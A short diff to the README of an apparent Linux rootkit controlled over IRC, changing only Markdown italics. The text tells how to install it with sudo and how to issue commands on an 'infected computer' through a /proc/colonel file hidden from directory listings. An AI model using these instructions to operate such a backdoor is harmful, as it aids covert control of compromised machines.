@@ -7,7 +7,7 @@ Requirements:
 
 
 ## Installation
-Note: channel, server and nickname should be set in irc/bot.py prior to installation.
+_Note: channel, server and nickname should be set in irc/bot.py prior to installation._
 
 To install: `sudo ./install`
 
@@ -16,7 +16,7 @@ Uninstalling can be accomplished by running `./uninstall`.
 ## Usage
 From infected computer:
 
-`cat /proc/colonel` to see available commands. _File will not be visible on content listing of /proc. 
+`cat /proc/colonel` to see available commands. _File will not be visible on content listing of /proc._
 
 To pass commands use the included program: `./rtcmd <command>` 
 or echo: `echo -n <command> >> /proc/colonel`
